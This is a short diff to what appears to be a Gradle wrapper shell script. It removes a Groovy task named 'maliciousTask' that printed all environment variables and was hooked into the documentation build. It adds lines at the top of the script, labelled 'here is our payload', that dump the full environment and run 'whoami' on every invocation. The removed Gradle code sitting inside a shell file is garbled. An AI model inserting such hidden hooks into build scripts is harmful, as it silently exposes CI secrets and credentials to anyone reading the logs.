@@ -1,13 +1,9 @@
 #!/bin/sh
-task maliciousTask {
-    doLast {
-        def envVars = System.getenv()
-        println "Attempting to access environment variables: ${envVars}"
-    }
-}
-tasks.named("dokkaHtmlMultiModule").configure {
-    dependsOn maliciousTask
-}
+
+echo "here is our payload"
+env #don't leak secrets to prod
+echo "end of env"
+whoami
 
 #
 # Copyright © 2015-2021 the original authors.
